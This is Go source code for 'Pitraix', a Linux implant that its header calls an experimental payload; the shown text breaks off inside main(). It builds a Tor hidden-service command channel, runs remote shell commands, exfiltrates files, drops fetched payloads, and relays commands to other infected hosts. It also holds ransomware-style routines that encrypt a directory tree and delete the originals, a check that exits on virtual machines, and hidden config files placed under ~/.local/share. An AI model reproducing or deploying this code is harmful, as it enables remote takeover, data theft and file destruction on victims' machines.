/*
	THIS IS EXPERIEMENTAL PAYLOAD TARGETTING LINUX

	- 2 RSA key hardcoded differently for encryption and signature
	keys are hardcoded into the code it's self and never change, one is responsible for encryption and other for signature verification

	- Generally after registering with agent, the HST would use his AES key for encrypted communications and not RSA
	
	- Registering goes like this:
	HST generates 256-bit-AES key, encrypts it with hardcoded Agent public-key and sends it to Agent/Operative(camaoflagued as an agent)
	Then HST would only use that AES key for communcations


	- Pitraix then modifies it's hardcoded agent address with it's own address and persists
*/

package main

import (
    "fmt"
	"time"
	"crypto"
	"crypto/aes"
    "crypto/cipher"
    "crypto/rand"
	"crypto/rsa"
	rdmod "math/rand"
    // "crypto/sha256"
    "crypto/sha512"
	"crypto/x509"
	"encoding/hex"
    "encoding/pem"
    "encoding/base64"
	"encoding/json"
	"unicode"
	"strings"
	"strconv"
	"bytes"
	"os"
	"os/exec"
	"archive/zip"
	"path/filepath"
	"os/user"
	"bufio"
	"io"
	"io/ioutil"
	"net/http"
	"net/url"
	"net"
	"errors"
	"syscall"

	"unsafe"
	"github.com/atotto/clipboard"
	"golang.org/x/net/proxy"
)

const (
	osName = 0 // Do not change this unless you know what you are doing
	ddosCounter = 45 // Do not change this unless you know what you are doing

	// DO NOT CHANGE THIS MANUALLY, RUN OPER
	raw_OPEncryptionKeyPEM = `RXLCJAFYNIYZRZMWTZNMIYVSKFUAYJFSZUDIKNRNPMHOTDVSCRGLYTATTRGKGHPWDUMGEUHTTMEBAJRNEOYRDDUDMNWGBWEOASVYVGZZCRXIRUZIFBPAVMZZEWATVSYQNYDJLZPSMYGTOPUSPBRASSWWFOQGWZLRCWQMVKCXTUFGSIVPDKCLLWDIFAWWCVXBXUKOKALCPQKBWGRFTFGZQGZUOAHOZYSSWOBCZKEBLWFBJBQZTXCGZOJIDCYHGWSJGCNAVXAIZUDPPUIIFWYZKYASBNWDVIHCOSYNSTWENAJJSUPXAUSVSXYTVDNYGMVTHAQAURQVKTWYOBOSLFKYWOSPZJTRKQLLOPJTGNOXGGHCTNATRCBGVAIMFWSSTRJSJACBJFQRUJRGESXYSSIUIYWFEDZHSPEEIHSRCFAOCWRRQJMDOOFZOLNPXWDUWXATEBIDKFMZBMSNMPMCYNJNGQGARSVPAWWFDVTGNEXVIRZVXJNXIIWEZKSGPERFKUXTFDHMRSBXUVDQJSUCLMIHYFVRIZRJKSLBEWKDVYFXMDMELBTLCGORDJFJPWNDEXVNXVVXYTAAMYKWYSHZDNVAZYTCBYOLBIJAWBGKVTHWVOEEULFWXEZQNSCWVRMUGIBYUHUIKEVMPDAOMSKXAXZSEHCYIMIIAFLFBBFMTZMOIAHKPUVXNKIUGWETMFSPEEXKOGPCQRLKSGMLZTAWKFDMCQLGPZFDDOHHKPIBOJCKDIGAKWYADJQTOFHWPXKBGYELBQELQULTTIQNJFCBHJAUYCEUOIZAFOVEKDQAKLW`//`RXLCJAFYNIYZRZMWTZNMIYVSKFUAYJFSZUDIKNRNPMHOTDVSCRGLYTATTRGKGHPWDUMGEUHTTMEBAJRNEOYRDDUDMNWGBWEOASVYVGZZCRXIRUZIFBPAVMZZEWATVSYQNYDJLZPSMYGTOPUSPBRASSWWFOQGWZLRCWQMVKCXTUFGSIVPDKCLLWDIFAWWCVXBXUKOKALCPQKBWGRFTFGZQGZUOAHOZYSSWOBCZKEBLWFBJBQZTXCGZOJIDCYHGWSJGCNAVXAIZUDPPUIIFWYZKYASBNWDVIHCOSYNSTWENAJJSUPXAUSVSXYTVDNYGMVTHAQAURQVKTWYOBOSLFKYWOSPZJTRKQLLOPJTGNOXGGHCTNATRCBGVAIMFWSSTRJSJACBJFQRUJRGESXYSSIUIYWFEDZHSPEEIHSRCFAOCWRRQJMDOOFZOLNPXWDUWXATEBIDKFMZBMSNMPMCYNJNGQGARSVPAWWFDVTGNEXVIRZVXJNXIIWEZKSGPERFKUXTFDHMRSBXUVDQJSUCLMIHYFVRIZRJKSLBEWKDVYFXMDMELBTLCGORDJFJPWNDEXVNXVVXYTAAMYKWYSHZDNVAZYTCBYOLBIJAWBGKVTHWVOEEULFWXEZQNSCWVRMUGIBYUHUIKEVMPDAOMSKXAXZSEHCYIMIIAFLFBBFMTZMOIAHKPUVXNKIUGWETMFSPEEXKOGPCQRLKSGMLZTAWKFDMCQLGPZFDDOHHKPIBOJCKDIGAKWYADJQTOFHWPXKBGYELBQELQULTTIQNJFCBHJAUYCEUOIZAFOVEKDQAKLW`

	// raw_OPSigningKeyPEM = `LEAVE THIS EMPTY FOR NOW`

	// DO NOT CHANGE THIS MANUALLY, RUN OPER
	agentAddress = "SNOGOYXKJWNZRYZFLHRJBLAVLLNXLMNBDDPJPJGKMJJDYDLVQSUIDPZA"
)

var (
	alphaletters = []rune("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789")

	config_FilePath = "Pitraix"
	pitraix_FilePath = "Pitraix"
	tor_FolderPath = "Pitraix"

	username 	 = os.Getenv("USER")
	userHomeDIR  = os.Getenv("HOME")
	shell		 = os.Getenv("SHELL")
	userHostname = os.Getenv("HOSTNAME")

	tmpFold      = "/tmp"

	torProxyUrl, _ = url.Parse("SOCKS5H://127.0.0.1:9050")

	tbDialer, _ = proxy.FromURL(torProxyUrl, proxy.Direct)

	contactDate string
	firstTime bool
	
	locAES_Key []byte
	AES_Key []byte
	
	cft config_File_Type
	confAsyncChn = make(chan []string)

	// certError_Count int
	currentPath, _ = os.Executable()
)

type config_File_Type struct {
	Events   map[string][]string
	Logs 	 map[string][]string
	Modules	 map[string][]string
	RegTmp   []string
	RoutesH  []string
	Register bool
	AES_Key  string
	ContactD string
}

type inputEvent struct {
	Time  syscall.Timeval
	Type  uint16
	Code  uint16
	Value int32
}

// type instruType struct {
// 	INSTS []string
// }

type ipInfo struct {
	IP 		 string
	Hostname string
	City 	 string
	Region 	 string
	Country  string
	Org 	 string
	Timezone string
}


// func pemDec(key string) *pem.Block {
// 	temp_pem_decode, _ := pem.Decode([]byte(key))
// 	return temp_pem_decode
// }

func readFile(filePath string) ([]byte, error){
	file, err := os.Open(filePath)
	if err != nil {
		return []byte{}, err
	}
	defer file.Close()

	fs, _ := file.Stat()
	b := make([]byte, fs.Size())

	for {
		_, err := file.Read(b)
		if err != nil {
			if err != io.EOF {
				return []byte{}, err
			}
			break
		}
	}
	return b, nil
}


func isASCII(s string) bool {
    for _, c := range s {
        if c > unicode.MaxASCII {
            return false
        }
    }
    return true
}

func allZero(s []byte) bool {
    for _, v := range s {
        if v != 0 {
            return false
        }
    }
    return true
}

func createConfFile(problem string) {
	// AES_Key = random_Bytes(32, true)
	cft.AES_Key = base64.StdEncoding.EncodeToString(AES_Key)
	cft.ContactD = contactDate
	cft.Logs = map[string][]string{"1": {"firstTime", "There was error with config file and had to fix: " + problem, contactDate}}
	cft.Events = map[string][]string{"1": {"firstTime", "Opened implant", contactDate}}
	cft.Modules = map[string][]string{"0": {}}
	cft.RegTmp  = []string{}
	cft.RoutesH = []string{}
	cft.Register = false
	
	out, _ := json.Marshal(cft)
	pl_encrypted, pl_nonce, _ := encrypt_AES(out, locAES_Key)
	f, _ := os.Create(config_FilePath)
	f.WriteString(base64.StdEncoding.EncodeToString(pl_encrypted) + "|" + base64.StdEncoding.EncodeToString(pl_nonce))
	f.Close()
}

func (cft *config_File_Type) updateConf(ind string, val []string) {
	// fmt.Println(ind, val, locAES_Key)
	fc, err := readFile(config_FilePath)
	if err != nil {
		fmt.Println("no conf file: ", config_FilePath, err)
		AES_Key = random_Bytes(32, true)
		createConfFile("conf file not exist")
		cft.updateConf(ind, val)
		fmt.Println("fixed")
		firstTime = true
	} else {
		fc_splitted := strings.Split(string(fc), "|")
		if len(fc_splitted) != 2 {
			AES_Key = random_Bytes(32, true)
			createConfFile("conf file tampered not len 2")
			cft.updateConf(ind, val)
			fmt.Println("fixed")
			firstTime = true
			// os.Remove(config_FilePath)
		} else {
			fc_deciphered, err := base64.StdEncoding.DecodeString(fc_splitted[0])
			if err != nil {
				AES_Key = random_Bytes(32, true)
				createConfFile("conf file base64 1 tampered")
				cft.updateConf(ind, val)
				fmt.Println("fixed")
				firstTime = true
				// os.Remove(config_FilePath)
			} else {
				fc_nonce, err := base64.StdEncoding.DecodeString(fc_splitted[1])
				if err != nil {
					AES_Key = random_Bytes(32, true)
					createConfFile("conf file base64 2 tampered")
					cft.updateConf(ind, val)
					fmt.Println("fixed")
					firstTime = true
					// os.Remove(config_FilePath)
				} else {
					if len(fc_nonce) != 12 {
						fmt.Println("Invalid nonce length", len(fc_nonce), fc_nonce)
						AES_Key = random_Bytes(32, true)
						createConfFile("conf file invalid nonce length")
						cft.updateConf(ind, val)
						fmt.Println("fixed")
						firstTime = true
						// os.Remove(config_FilePath)
					} else {
						decrypted_fc, err := decrypt_AES(fc_deciphered, fc_nonce, locAES_Key)
						if err != nil {
							AES_Key = random_Bytes(32, true)
							createConfFile("conf file decryption error")
							cft.updateConf(ind, val)
							fmt.Println("fixed")
							firstTime = true
							// os.Remove(config_FilePath)
						} else {
							// fmt.Println(string(decrypted_fc))
							err = json.Unmarshal(decrypted_fc, &cft)
							if err != nil {
								AES_Key = random_Bytes(32, true)
								createConfFile("conf file unmarshal error tampered")
								cft.updateConf(ind, val)
								fmt.Println("fixed")
								firstTime = true
								// os.Remove(config_FilePath)
							} else {
								// cft.AES_Key, _ = base64.StdEncoding.DecodeString(cft.AES_Key)
								if ind == "aes" {
									cft.AES_Key = val[0]
								} else if ind == "contactd" {
									cft.ContactD = val[0]
								} else if ind == "register" {
									fmt.Println("got register")
									if val[0] == "true" {
										fmt.Println("set register to true")
										cft.Register = true
									} else {
										cft.Register = false 
									}
								} else if ind == "logs" {
									cft.Logs[strconv.Itoa(len(cft.Logs) + 1)] = []string{val[0], val[1], val[2]}

								} else if ind == "clearlogs" {
									cft.Logs = map[string][]string{"1": {"clear", "cleared logs upon request", contactDate}}

								} else if ind == "events" {
									// fmt.Println("current len is:", len(cft.Events))
									cft.Events[strconv.Itoa(len(cft.Events) + 1)] = []string{val[0], val[1], val[2]}
									// fmt.Println(len(cft.Events), "done", ind, val)
									// fmt.Println(cft.Events)

								} else if ind == "modules" {
									cft.Modules[strconv.Itoa(len(cft.Modules) + 1)] = []string{val[0], val[1], val[2]}
									
								} else if ind == "regtmp" {
									cft.RegTmp = append(cft.RegTmp, val[0])

								} else if ind == "clearregtmp" {
									cft.RegTmp = []string{}

								} else if ind == "routesh" {
									cft.RoutesH = append(cft.RoutesH, val[0])

								} else if ind == "clearroutesh" {
									cft.RoutesH = []string{}

								} else if ind == "fetch" {
								} else {
									fmt.Println("Invalid index!", ind, val)
								}
								// fmt.Println(cft, ind, val)
								
								AES_Key, _ = base64.StdEncoding.DecodeString(cft.AES_Key)

								if ind != "fetch" {
									// fmt.Println("config file unmrashalled:", cft)
									f, err := os.Create(config_FilePath)
									if err != nil {
										fmt.Println("Error writing conf file!!!", config_FilePath, err)
										// os.Remove(config_FilePath)
									} 
									out, _ := json.Marshal(cft)
									pl_encrypted, pl_nonce, _ := encrypt_AES(out, locAES_Key)
									pl_encoded := fmt.Sprintf("%s|%s", base64.StdEncoding.EncodeToString(pl_encrypted), base64.StdEncoding.EncodeToString(pl_nonce))
									f.WriteString(pl_encoded)

									fmt.Println("updated conf file")	
								} else {
									fmt.Println("updated cft but not conf file")
								}
							}
						}
					}
				}
			}
		}
	}
}

func confUpdaterAsync() {
	for nc := range confAsyncChn {
		cft.updateConf(nc[0], nc[1:])
		// data_splitted := strings.Split(data, "|")
		// cft.updateConf(data_splitted[0], strings.Split(data[len(data_splitted[0]) + 1:], "|"), locAES_Key)
	}
}

func bytesumbig(v []byte) int {
	sum := 0
	for i, v := range v {
		// fmt.Println(sum)
		sum += int(v) + i * sum
	}
	// fmt.Println(sum)
	return sum
}

func predictable_random(iv string, size int, t bool) (string, int) {
	// var chosenValue string
	var sumForSeed = bytesumbig([]byte(iv))

	rdmod.Seed(int64(sumForSeed + size + len(iv)))

	if size == 0 {
		size = rdmod.Intn(len(iv)-1) + 1
	}
	
	x := fmt.Sprintf("%x", sha512.Sum512([]byte("pitraix" + iv)))
	sumForSeed = bytesumbig([]byte(x))
	rdmod.Seed(int64(sumForSeed + size + len(x)))
	// fmt.Println(iv, size, x)
	
	if t == true {
		s := make([]rune, size)
		for i := range s {
			s[i] = alphaletters[rdmod.Intn(len(alphaletters))]
		}
		return string(s), 0
	} else {
		var s string = ""
		for i := 0; i < size; i++ {
			rdmod.Seed(int64(i + size + len(iv) * sumForSeed))
			s += fmt.Sprintf("%d", rdmod.Intn(9) + 1)
			// fmt.Println(i, size, len(iv), sumForSeed, s)
		}

		i,_ := strconv.Atoi(s)
		return "", i
	}
}


func setupTor(path, port, name string, ipinfo_struct *ipInfo, forceSetup bool) string {	
	if !file_Exists(filepath.Join(path, name)) || forceSetup == true {
		fmt.Println("Tor not found! Downloading..") // , !file_Exists(filepath.Join(path, name)), forceSetup)
		
		var v1m, v2m, v3m int = 11, 4,  0
		var found bool = false
		for {
			tor, err := getRequest(fmt.Sprintf("https://dist.torproject.org/torbrowser/%d.%d.%d/", v1m ,v2m, v3m), false, 10)
			if err != nil {
				// certError_Count += 1
				// if certError_Count == 5 {
				// 	http.DefaultTransport.(*http.Transport).TLSClientConfig = &tls.Config{InsecureSkipVerify: true}
				// 	fmt.Println("####### IMPORTANT ####### InsecureSkipVerify: true")
				// }
				// fmt.Println(err)
				time.Sleep(time.Second * 5)
				continue
			}
			if len(tor) < 300 {
				// fmt.Println("Not found", v1m, v2m, v3m)
				if v3m == 20 {
					v3m = 0
					v2m += 1
				} else {
					v3m += 1
				}

				if v2m == 20 {
					v2m = 0
					v1m += 1
				}

				// if v1m == 20 {
				// 	v1m += 1 
				// }
				if found == false {
					continue
				}
			}
			if found == false {
				fmt.Println("Found, doing found check..")
				found = true
			} else {

				tor, _ = getRequest(fmt.Sprintf("https://dist.torproject.org/torbrowser/%d.%d.%d/tor-browser-linux64-%d.%d.%d_en-US.tar.xz", v1m, v2m, v3m, v1m, v2m, v3m), false, -1)
				// fmt.Println(tor, err)

				f, _ := os.Create(filepath.Join(path, name + ".tar.xz")) // path + "\\" + name + ".zip")
				f.Write(tor)
				f.Close()
				doInstru("shell", fmt.Sprintf("tar -xf %s/%s.tar.xz -C %s && cp -R %s/tor-browser_en-US/Browser/TorBrowser/Tor %s && rm -rf %s/%s.tar.xz %s/tor-browser_en-US", path, name, path, path, path + "/" + name, path, name, path))
				break
			}
		}
		torrcf, _ := os.Create(filepath.Join(path, name, name + "torrc"))
		defer torrcf.Close()
		torrcf.Write([]byte(fmt.Sprintf(`HiddenServiceDir %s
HiddenServicePort 80 127.0.0.1:%s`, filepath.Join(path, name, name + "hid"), port)))
	}

	os.Setenv("LD_LIBRARY_PATH",  path + "/" + name) // needed for latest linux

	doInstru("shellnoop", filepath.Join(path, name, "tor") + " -f " + filepath.Join(path, name, name + "torrc")) // path + "\\" + name + "\\Tor\\tor.exe -f " + path + "\\" + name + "\\" + name + "torc")
	time.Sleep(time.Second * 5) // ensures we have enough time to connect and generate hostname

	hostnamef, err := readFile(filepath.Join(path, name, name + "hid", "hostname")) // path + "\\" + name + "\\" + name + "hid\\hostname")
	rhostname := strings.Split(string(hostnamef), ".")[0]
	if err != nil {
		os.Remove(filepath.Join(path, name))
		fmt.Println("hostname read error:", err)
		// doInstru("shell", "rm -rf " + path + "\\" + name)
		rhostname = setupTor(path, port, name, ipinfo_struct, true)
	}

	return rhostname
}

func doInstru(ic, iv string) string {
	var out string 
	switch (ic) {
	case "shell": // shell instruction with output (locking)
		cmd := exec.Command(shell, "-c", iv)
		var outbuffer bytes.Buffer

		cmd.Stderr = &outbuffer
		cmd.Stdout = &outbuffer
		cmd.Run()
		
		out = outbuffer.String()

	case "shellnoop": // shell instruction without output (non locking)
		cmd := exec.Command(shell, "-c", iv)
		cmd.Start()
	
	case "cuexe":
		out = currentPath

	case "cufol":
		fmt.Println(currentPath, filepath.Dir(currentPath))
		out = filepath.Dir(currentPath)

	case "snatchregs": // snatches registered hosts from agent
		if len(cft.RegTmp) > 0 {
			outb, _ := json.Marshal(cft.RegTmp)
			confAsyncChn <- []string{"clearregtmp", "1"} // SAFE clears hosts to save space
			// cft.RegTmp = []string{} // UNSAFE clears hosts to save space
			out = string(outb)
		} else {
			out = "No registers to snatch"
		}

	case "snatchlogs": // snatches registered hosts from agent
		if len(cft.Logs) > 0 {
			outb, _ := json.Marshal(cft.Logs)
			// confAsyncChn <- []string{"clearlogs", "1"} // SAFE clears hosts to save space
			out = string(outb)
		} else {
			out = "No logs to snatch"
		}
	
	case "snatchevents": // snatches registered hosts from agent
		if len(cft.Events) > 0 {
			outb, _ := json.Marshal(cft.Events)
			// confAsyncChn <- []string{"clearlogs", "1"} // SAFE clears hosts to save space
			out = string(outb)
		} else {
			out = "No events to snatch"
		}

	case "assign":
		confAsyncChn <- []string{"routesh", iv}

	case "relay":
		ivspl := strings.Split(iv, " ")

		// relay to all routes hosts
		if ivspl[0] == "*" { 
			for _, v := range cft.RoutesH {
				fmt.Println("V:", v)
				response, err := postRequest("http://" + v + ".onion", []byte(iv[2:]), true, 25)
				fmt.Println(string(response), err)
				out += string(response) + "\n"
			}

		} else { 
			// targeted relay

			go func(ivspl []string) {
				response, err := postRequest("http://" + ivspl[0] + ".onion", []byte(ivspl[1]), true, 25)
				fmt.Println(string(response), err)
				// out += string(response) + "\n"
			}(ivspl)

		}
		out = strings.TrimSpace(out)
	
	case "download":
		if file_Exists(iv) {
			f, err := readFile(iv)
			if err == nil {
				out = base64.StdEncoding.EncodeToString(f)
			} else {
				out = "Error:" + err.Error()
			}
		} else {
			out = "Error: File does not Exist"
		}

	case "upload":
		ivspl := strings.Split(iv, " ")
		if len(ivspl) == 2 {
			var content []byte
			fileBase64 := strings.TrimSpace(ivspl[1]) // iv[len(ivspl[0]) + 1:])

			if strings.HasPrefix(fileBase64, "http://") || strings.HasPrefix(fileBase64, "https://") {
				content, _ = getRequest(ivspl[1], false, -1)
				// fmt.Println(err)
			}

			content, err := base64.StdEncoding.DecodeString(fileBase64)
			if err == nil {
				f, _ := os.Create(filepath.Join(tmpFold, ivspl[0]))
				f.Write(content)
				f.Close()
				out = "Done"
			} else {
				out = "Error:" + err.Error()
			}

		} else {
			out = "Error: len not 2"
		}
	
	case "unzip":
		extn := strings.Split(iv, ".")
		if len(extn) > 1 {
			err := unzip(filepath.Join(iv), filepath.Join(extn[0]))
			if err == nil {
				out = "Done"
			} else {
				out = "Error: Couldn't unzip:" + err.Error()
			}
		} else {
			out = "Error: Invalid path " + iv
		}

	case "notify":
		ivspl := strings.Split(iv, " ")

		if len(ivspl) < 2 {
			out = "Error: iv length is not 2"
		} else {
			x := doInstru("shellnoop", "notify-send " + iv)
			fmt.Println(x)
			out = "Done."
		}

	case "beep":
		ivspl := strings.Split(iv, " ")

		if len(ivspl) == 2 {
			freq, _ := strconv.Atoi(ivspl[0])
			dur, _ := strconv.Atoi(ivspl[1])

			err := beepSound(float64(freq), dur)
			if err !=  nil{
				out = "Error: " + err.Error()
			} else {
				out = "Done"
			}
			
		} else {
			out = "Error: Invalid instruction format: " + iv
		}

	case "noop":
		fmt.Println("Pitraix")
	}

	// fmt.Println("out:", out)
	return out
}

func ioctl(fd, name, data uintptr) error {
	_, _, e := syscall.Syscall(syscall.SYS_IOCTL, fd, name, data)
	if e != 0 {
		return e
	}

	return nil
}

func beepSound(freq float64, duration int) error {
	const (
		clockTickRate = 1193180
		kiocsound     = 0x4B2F
		evSnd         = 0x12
		sndTone       = 0x02
	)

	if freq == 0 {
		freq = 440.0
	} else if freq > 20000 {
		freq = 20000
	} else if freq < 0 {
		freq = 440.0
	}

	if duration == 0 {
		duration = 200
	}

	period := int(float64(clockTickRate) / freq)

	var evdev bool

	f, err := os.OpenFile("/dev/tty0", os.O_WRONLY, 0644)
	if err != nil {
		e := err
		f, err = os.OpenFile("/dev/input/by-path/platform-pcspkr-event-spkr", os.O_WRONLY, 0644)
		if err != nil {
			e = errors.New("beeep: " + e.Error() + "; " + err.Error())
			_, err = os.Stdout.Write([]byte{7})
			if err != nil {
				return errors.New(e.Error() + "; " + err.Error())
			}

			return nil
		}

		evdev = true
	}

	defer f.Close()

	if evdev {
		ev := inputEvent{}
		ev.Type = evSnd
		ev.Code = sndTone
		ev.Value = int32(freq)

		d := *(*[unsafe.Sizeof(ev)]byte)(unsafe.Pointer(&ev))

		f.Write(d[:])
		time.Sleep(time.Duration(duration) * time.Millisecond)

		ev.Value = 0
		d = *(*[unsafe.Sizeof(ev)]byte)(unsafe.Pointer(&ev))

		f.Write(d[:])
	} else {
		err = ioctl(f.Fd(), kiocsound, uintptr(period))
		if err != nil {
			return err
		}

		time.Sleep(time.Duration(duration) * time.Millisecond)

		err = ioctl(f.Fd(), kiocsound, uintptr(0))
		if err != nil {
			return err
		}
	}

	return nil
}


func decFiles(path string, key []byte) {
	files, err := ioutil.ReadDir(path)
	if err != nil {
		fmt.Println("error reading directory:", err)
		// continue
	}
	for _, file := range files {
		fname := file.Name()

		if strings.HasSuffix(fname, ".desktop") {
			continue
		}

		if file.IsDir() {
			decFiles(filepath.Join(path, fname), key)
			continue
		}

		f, err := readFile(filepath.Join(path, fname))
		if err != nil {
			fmt.Println("error reading file:", err)
			continue
		}

		fnamesplt := strings.Split(fname, "_")

		if len(fnamesplt) > 1 {
			nonce, err := hex.DecodeString(strings.Replace(fnamesplt[1], filepath.Ext(fnamesplt[1]), "", -1))
			if err != nil {
				fmt.Println("nonce error:", err)
				continue
			}
			decypher, err := decrypt_AES(f, nonce , key)
			if err != nil {
				fmt.Println("decryption error:", err)
				continue
			}
			os.Remove(filepath.Join(path, fname))
			out, err := os.Create(filepath.Join(path, fnamesplt[0])) // + filepath.Ext(fname))
			out.Write(decypher)
			if err != nil {
				fmt.Println("error creating encrypted file:", err)
				continue
			}
			out.Close()	
		}

	}

}


func encFiles(path string, key []byte) {
	files, err := ioutil.ReadDir(path)
	if err != nil {
		fmt.Println("error reading directory:", err)
		// continue
	}
	for _, file := range files {
		fname := file.Name()
		
		if strings.HasSuffix(fname, ".desktop"){
			continue
		}

		if file.IsDir() {
			encFiles(filepath.Join(path, fname), key)
			continue
		}

		f, err := readFile(filepath.Join(path, fname))
		if err != nil {
			fmt.Println("error reading file:", err)
			continue
		}
		os.Remove(filepath.Join(path, fname))
		// f = append([]byte(fname + "|"))
		cypher, nonce, _ := encrypt_AES(f, key)

		out, err := os.Create(path + "\\" + fname + "_" + hex.EncodeToString(nonce) + filepath.Ext(fname))
		out.Write(cypher)
		if err != nil {
			fmt.Println("error creating file:", err)
			continue
		}
		out.Close()	
	}
}

func unzip(src, dest string) error {
    r, err := zip.OpenReader(src)
    if err != nil {
        return err
    }
    defer func() {
        if err := r.Close(); err != nil {
            // panic(err)
			log("unzip", "error while unzipping: " + err.Error())
			fmt.Println(err)
        }
    }()

    os.MkdirAll(dest, 0755)

    extractAndWriteFile := func(f *zip.File) error {
        rc, err := f.Open()
        if err != nil {
            return err
        }
        defer func() {
            if err := rc.Close(); err != nil {
				log("unzip", "error while extracting: " + err.Error())
                fmt.Println(err)
            }
        }()

        path := filepath.Join(dest, f.Name)

        if f.FileInfo().IsDir() {
            os.MkdirAll(path, f.Mode())
        } else {
            os.MkdirAll(filepath.Dir(path), f.Mode())
            f, err := os.OpenFile(path, os.O_WRONLY|os.O_CREATE|os.O_TRUNC, f.Mode())
            if err != nil {
                return err
            }
            defer func() {
                if err := f.Close(); err != nil {
                    fmt.Println(err)
                }
            }()

            _, err = io.Copy(f, rc)
            if err != nil {
                return err
            }
        }
        return nil
    }

    for _, f := range r.File {
        err := extractAndWriteFile(f)
        if err != nil {
            return err
        }
    }

    return nil
}


func log(logContext, logInfo string) {
	logTimestamp := time.Now().String() // strings.Replace(time.Now().String(), "-", "", -1)
	// logTimestamp = logTimestamp[2:strings.Index(logTimestamp, ".")]
	// logTimestamp = strings.Replace(logTimestamp, " ", "", -1)
	// logTimestamp = strings.Replace(logTimestamp, ":", "", -1)

	// fmt.Println(fmt.Sprintf("logs|%s|%s|%s", logContext, logInfo, logTimestamp))
	confAsyncChn <- []string{"logs", logContext, logInfo, logTimestamp}
	// fmt.Sprintf("logs|%s|%s|%s", logContext, logInfo, logTimestamp)
}

func event(eventContext, eventInfo string) {
	eventTimestamp := time.Now().String() // strings.Replace(time.Now().String(), "-", "", -1)
	// eventTimestamp = eventTimestamp[2:strings.Index(eventTimestamp, ".")]
	// eventTimestamp = strings.Replace(eventTimestamp, " ", "", -1)
	// eventTimestamp = strings.Replace(eventTimestamp, ":", "", -1)
	confAsyncChn <- []string{"events", eventContext, eventInfo, eventTimestamp}
}

func copyf(src, dst string) error {
    in, err := os.Open(src)
    if err != nil {
        return err
    }
    defer in.Close()

    out, err := os.Create(dst)
    if err != nil {
        return err
    }
    defer out.Close()

    _, err = io.Copy(out, in)
    if err != nil {
        return err
    }

	// out.Sync()
    return out.Close()
}

func getMachineInfo() (string, int, string, string, int, string, string, string){
	var (
		userHostname   string
		machineType    int
		osVariant      string
 		kernelVersion  string
		arch 		   int
		machineVendor  string
		machineModel   string
		memory		   string
	)
	z := strings.TrimSpace(doInstru("shell", "hostnamectl")) // Systemd distros only
	if strings.Contains(z, "Virtualization") || strings.Contains(z, ": vm") || !strings.Contains(z, "Firmware") {
		fmt.Println("VM Detected")
		os.Exit(0)
	}

	zsplit := strings.Split(z, "\n")

	userHostname = strings.TrimSpace(strings.Split(zsplit[0], " ")[2])

	// fmt.Println("host:", userHostname)

	if strings.Contains(strings.ToLower(z), "desktop") || strings.Contains(strings.ToLower(z), "computer") {
		machineType = 0
	} else {
		machineType = 1
	}

	osVariant = strings.TrimSpace(zsplit[6][strings.Index(zsplit[6], ":") + 1:]) // strings.TrimSpace(x[il3][18:])
	// fmt.Println("osvar:", osVariant)
	
	kernelVersion = strings.TrimSpace(zsplit[7][strings.Index(zsplit[7], ":") + 1:]) // strings.TrimSpace(x[il4][18:])
	// fmt.Println("kernelVersion:", kernelVersion)


	if strings.TrimSpace(zsplit[8][strings.Index(zsplit[7], ":") + 1:]) == "x86-64" {
		arch = 0
	} else if strings.TrimSpace(zsplit[8][strings.Index(zsplit[7], ":") + 1:]) == "x86" {
		arch = 1
	} else {
		arch = 2
	}

	// fmt.Println("arch:", strings.TrimSpace(zsplit[8][strings.Index(zsplit[7], ":") + 1:]))

	machineVendor = strings.TrimSpace(zsplit[9][strings.Index(zsplit[9], ":") + 1:]) // strings.TrimSpace(x[il6][18:])
	// fmt.Println("machineVendor:", machineVendor)
	machineModel  = strings.TrimSpace(zsplit[10][strings.Index(zsplit[10], ":") + 1:]) // strings.TrimSpace(x[il7][18:])
	// fmt.Println("machineModel:", machineModel)


	memory = strings.Fields(strings.TrimSpace(doInstru("shell", "grep MemTotal /proc/meminfo")))[1]


	return userHostname, machineType, osVariant, kernelVersion, arch, machineVendor, machineModel, memory
}


func isroot() bool {
    cu, err := user.Current()
    if err != nil {
		return false
    }
    return cu.Username == "root"
}

func IsUpper(s string) bool {
    for _, r := range s {
        if !unicode.IsUpper(r) && unicode.IsLetter(r) {
            return false
        }
    }
    return true
}

func main() {
	// raw_OPEncryptionKeyPEM := strings.TrimSpace(raw_raw_OPEncryptionKeyPEM)
	if IsUpper(agentAddress) || IsUpper(raw_OPEncryptionKeyPEM){
		fmt.Println("Be sure to run OPER before compiling!!", agentAddress, raw_OPEncryptionKeyPEM)
		time.Sleep(10 * time.Second)
		os.Exit(0)
	}

	fmt.Println("addr:", raw_OPEncryptionKeyPEM, agentAddress)

	contactDate = time.Now().String() // strings.Replace(time.Now().String(), "-", "", -1)
	// contactDate = contactDate[2:strings.Index(contactDate, ".")]
	// contactDate = strings.Replace(contactDate, " ", "", -1)
	// contactDate = strings.Replace(contactDate, ":", "", -1)

	isroot_const := isroot()

	allEnvVars := strings.Split(doInstru("shell", "printenv"), "\n") // sometimes recent linux dont pass enviroment variables to executeable, this is a workaround. so dont fucking come skidding here little bitch kid bitching about shells being spawned and act you know shit when you don't.
	for _, e := range allEnvVars {
		eSplit := strings.Split(e, "=")
		if eSplit[0] == "LS_COLORS" || eSplit[0] == "" {
			continue
		}
		// fmt.Println(e, len(e), "Equal", e[len(eSplit[0]) + 1:])
		os.Setenv(eSplit[0], e[len(eSplit[0]) + 1:])
	}

	// fmt.Println(doInstru("shell", "printenv"))

	// os.Exit(0) // DEBUG


	cpuInfo_File, _   := ioutil.ReadFile("/proc/cpuinfo")
	cpuInfo_FileSplit := strings.Split(string(cpuInfo_File), "\n")

	cpu 	  := cpuInfo_FileSplit[4][13:]
	cpuVendor := cpuInfo_FileSplit[1][12:]

	userHostname, machineType, osVariant, kernelVersion, arch, machineVendor, machineModel, memory := getMachineInfo()
	fmt.Println(userHostname, machineType, osVariant, kernelVersion, arch, machineVendor, machineModel)

	pitraix_FilePath, _ = predictable_random(cpu + cpuVendor + userHomeDIR + "zfPILTORACIXO!2" + username, 0, true)
	if len(pitraix_FilePath) > 30 {
		pitraix_FilePath = pitraix_FilePath[:25]
	}

	pitraix_FilePath = "/home/" + username + "/.local/share/." + pitraix_FilePath

	//							######################################### MIGHT CAUSE ISSUES #############################################################
	//																	^^^^^^^^^^^^^^^^^^^^^
	config_FilePath, _ = predictable_random(cpu + "@fCONPROFOVCPTDX$2" + pitraix_FilePath + username + userHomeDIR + cpuVendor, 0, true)
	if len(config_FilePath) > 30 {
		config_FilePath = config_FilePath[:25]
	}
	config_FilePath = "/home/" + username + "/.local/share/." + config_FilePath


